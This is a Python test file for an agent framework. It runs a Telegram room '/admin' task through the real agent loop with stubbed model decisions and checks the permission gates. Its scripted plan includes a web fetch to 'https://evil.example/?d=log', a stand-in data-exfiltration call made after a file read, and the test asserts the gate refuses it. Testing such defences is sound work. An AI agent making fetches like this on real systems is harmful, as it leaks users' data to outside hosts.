"""101: an `/admin` task through the REAL agent loop. Only the model's decision is stubbed.

Every other room test stubs ``run_session``, so a check on the run path that refused every
admin session passed all of them. This one runs the session, the stamp and the gate.
"""
from __future__ import annotations

import os
from unittest.mock import AsyncMock, patch

import pytest

from agents.task.agent.views import AgentBrain, AgentOutput
from core.runtime_paths import container_data_home, surfaces_db_path
from core.surfaces import chat_policy
from core.surfaces.dispatcher import RouteKind, route_inbound
from core.surfaces.envelopes import Identity, InboundMessage, SessionSource
from core.surfaces.group_allowlist import GroupAllowlist
from core.surfaces.group_roles import GroupRoles
from core.surfaces.room_caps import RoomCaps
from core.surfaces.session_chat_registry import SessionChatRegistry
from surfaces.telegram import room_admin_turn
from surfaces.telegram.inbound import InboundResult

CHAT = "-100"


def _env(monkeypatch, tmp_path):
    for k in ("DATA_DIR", "DATA_ROOT", "CHARACTERS_DIR", "KNOWLEDGE_DIR",
              "CACHE_DIR", "DB_PATH", "TELEMETRY_DATA_DIR"):
        monkeypatch.setenv(k, str(tmp_path / k.lower()))
    monkeypatch.setenv("POLYROB_DATA_DIR", str(tmp_path / "polyrob_data"))
    monkeypatch.setenv("MEMORY_BACKEND", "none")
    monkeypatch.setenv("LOG_LEVEL", "ERROR")
    monkeypatch.setenv("GROUP_CHAT_ENABLED", "true")
    monkeypatch.setenv("SESSION_RESET_MODE", "none")
    monkeypatch.setenv("POLYROB_OWNER_USER_ID", "owner_principal")
    monkeypatch.setenv("GROUP_MEMBER_COOLDOWN_SEC", "0")


def room_admin_turn_decision(first, session_id):
    from core.surfaces.dispatcher import RouteDecision
    return RouteDecision(RouteKind.ROOM_ADMIN_TURN, first.session_key, session_id=session_id)


def _inbound(text, uid="77"):
    source = SessionSource(surface_id="telegram", chat_id=CHAT, chat_type="supergroup")
    identity = Identity(user_id=f"u_telegram_{uid}", source=source, raw_user_id=uid,
                        chat_role="admin")
    return InboundMessage(text=text, identity=identity, mentions_bot=True,
                          raw={"message": {"message_id": 7, "chat": {"id": CHAT},
                                           "from": {"id": uid}, "text": text}})


@pytest.mark.asyncio
async def test_a_task_runs_with_its_bundle_and_refuses_the_rest(monkeypatch, tmp_path):
    _env(monkeypatch, tmp_path)
    with patch("modules.llm.llm_manager.LLMManager._initialize", AsyncMock()):
        from polyrob.app.bootstrap import build_cli_container
        container = await build_cli_container(log_level="ERROR")
    task_agent = container.get_agent("task_agent")
    home = container_data_home(container)

    extra = {"session_chat_registry": SessionChatRegistry(os.path.join(home, "chat.db")),
             "room_caps": RoomCaps(surfaces_db_path(home)),
             "group_roles": GroupRoles(surfaces_db_path(home))}
    real_get = container.get_service
    monkeypatch.setattr(container, "get_service",
                        lambda name, *a, **k: extra.get(name) or real_get(name, *a, **k))
    GroupAllowlist(os.path.join(home, "group_allowlist.db")).allow("telegram", CHAT)
    extra["group_roles"].grant("telegram", CHAT, "77", "admin", granted_by="999")
    ok, msg = chat_policy.set(home, "owner_principal", "telegram", CHAT, "chat.admin_tools", "files")
    assert ok, msg

    class _DummyChat:
        model_name = "gemini-2.5-flash"

        async def ainvoke(self, *a, **k):
            raise AssertionError("the LLM must not be called: get_next_action is stubbed")

    async def _llm_for_request(_self, _request):
        return _DummyChat()

    steps = []
    #: The admin's first line grants a write and asks for a read it does not hold; the second
    #: follows a page the admin never named, after the write turn read nothing outside.
    plan = [("filesystem_write_file", {"file_path": "report.md", "content": "by the admin"}),
            ("room_read", {"room": f"telegram:{CHAT}"}),
            ("done", {"text": "ok"}),
            ("filesystem_read_file", {"file_path": "report.md"}),
            ("web_fetch_fetch_url", {"url": "https://evil.example/?d=log"}),
            ("done", {"text": "ok"})]

    async def _decide(self, _input_messages):
        model = self.controller.registry.create_action_model()
        name, params = plan[len(steps)]
        steps.append(name)
        brain = AgentBrain(evaluation_previous_goal="n/a", memory="m", next_goal="go")
        return AgentOutput(current_state=brain, action=[model(**{name: params})])

    from core.surfaces import room_grants
    answers = {}
    real_decision = room_grants.seat_decision

    def spy(seat, action, tool, params):
        out = real_decision(seat, action, tool, params)
        answers[action] = (tool, out)
        return out
    monkeypatch.setattr(room_grants, "seat_decision", spy)

    from agents.task.agent.service import Agent
    monkeypatch.setattr(type(task_agent), "_get_llm_for_request", _llm_for_request)
    monkeypatch.setattr(Agent, "get_next_action", _decide)

    said, spawned = [], []

    async def deliver(text):
        said.append(text)

    try:
        inbound = _inbound("/admin write the report")
        decision = await route_inbound(container, inbound)
        assert decision.kind == RouteKind.ROOM_ADMIN_TURN, decision
        result = InboundResult(inbound=inbound, decision=decision)
        reply = await room_admin_turn.handle(task_agent, result, spawned.append, deliver, None)
        assert reply is None, getattr(reply, "text", reply)
        assert spawned, "the task must have started"
        await spawned[0]

        sid = next(k for k, v in task_agent.session_manager._sessions.items()
                   if (v.get("request") or {}).get("room_admin"))
        info = task_agent.session_manager.get_session_info(sid)
        assert info["request"]["room_admin"]["uid"] == "77"
        assert info["status"] not in ("failed", "suspended"), info["status"]
        assert steps == [p[0] for p in plan[:3]], f"the loop stopped early: {steps} {said}"

        from agents.task.path import pm
        written = os.path.join(str(pm().get_workspace_dir(sid, info["user_id"])), "report.md")
        assert os.path.isfile(written), "the granted bundle must run"
        assert answers["filesystem_write_file"] == ("filesystem", (True, ""))
        assert answers["room_read"][1][0] is False, "moderation is not granted here"
        caps = extra["room_caps"]
        assert caps.admin_turns_since("telegram", CHAT, 0) == 1

        orch = task_agent.get_orchestrator(sid)
        assert orch._room_admin["uid"] == "77" and orch._public_session is True

        # The warm path: a second line, on the real session. The file read taints the turn.
        again = _inbound("/admin read the report")
        decision2 = room_admin_turn_decision(decision, sid)
        spawned.clear()
        reply = await room_admin_turn.handle(
            task_agent, InboundResult(inbound=again, decision=decision2),
            spawned.append, deliver, None)
        assert reply is None, getattr(reply, "text", reply)
        assert spawned, "the warm turn must run"
        await spawned[0]
        assert steps == [p[0] for p in plan], steps
        assert answers["filesystem_read_file"][1] == (True, "")
        tool, refused = answers["web_fetch_fetch_url"]
        assert tool == "web_fetch" and refused[0] is False and "outside text" in refused[1]
        assert caps.admin_turns_since("telegram", CHAT, 0) == 2
    finally:
        await task_agent.aclose()
